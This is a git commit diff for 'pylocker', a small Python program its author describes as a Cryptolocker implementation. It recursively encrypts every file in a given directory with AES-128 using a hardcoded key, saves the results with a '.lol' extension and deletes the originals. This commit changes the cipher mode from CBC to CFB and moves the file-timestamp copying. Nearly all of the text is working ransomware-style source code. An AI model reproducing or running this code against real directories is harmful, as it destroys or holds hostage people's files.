80bec02c23ead95b1b68f0edd39e8352ab3fc46d
Michael Salsone <p0psicl3stik@gmail.com>
2015-03-30 12:55:35 -0400

    renamed file, learning to use github lol

--- pylocker/pylocker.py
+++ pylocker/pylocker.py
@@ -8,24 +8,20 @@ from Crypto.Cipher import AES
 ###
 # Author: Michael Salsone (mas9190@rit.edu)
 # Cryptolocker implemented in python. When pointed at a directory, will
-# recursively encrypt all files in that directory with AES128.
+# recursively encrypt all files in that directory with AES-128.
 # Usage: ./pylocker <Absolute Path> <anything here will force decrypt>
 ###
 
-def pad(s):
-    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
-
 def encrypt(message, key, key_size=128):
-    message = pad(message)
     iv = Random.new().read(AES.block_size)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
+    cipher = AES.new(key, AES.MODE_CFB, iv)
     return iv + cipher.encrypt(message)
 
 def decrypt(ciphertext, key):
     iv = ciphertext[:AES.block_size]
-    cipher = AES.new(key, AES.MODE_CBC, iv)
+    cipher = AES.new(key, AES.MODE_CFB, iv)
     plaintext = cipher.decrypt(ciphertext[AES.block_size:])
-    return plaintext.rstrip(b"\0")
+    return plaintext
 
 def encrypt_file(file_name, key):
     with open(file_name, 'rb') as fo:
@@ -33,6 +29,7 @@ def encrypt_file(file_name, key):
     enc = encrypt(plaintext, key)
     with open(file_name + ".lol", 'wb') as fo:
 		fo.write(enc)
+    shutil.copystat(file_name, file_name + ".lol")
 
 def decrypt_file(file_name, key):
     with open(file_name, 'rb') as fo:
@@ -40,6 +37,8 @@ def decrypt_file(file_name, key):
     dec = decrypt(ciphertext, key)
     with open(file_name[:-4], 'wb') as fo:
         fo.write(dec)
+    shutil.copystat(file_name, file_name[:-4])
+
 
 def main():
 	key = b'sixteenbytekeyzz'
@@ -54,11 +53,9 @@ def main():
 			en_file = dirpath + "/" + files
 			if encryption_flag == True:
 				encrypt_file(en_file, key)
-				shutil.copystat(en_file, en_file + ".lol")
 				remove(en_file)
 			else:
 				decrypt_file(en_file, key)
-				shutil.copystat(en_file, en_file[:-4])
 				remove(en_file)
 
 if __name__ == "__main__":
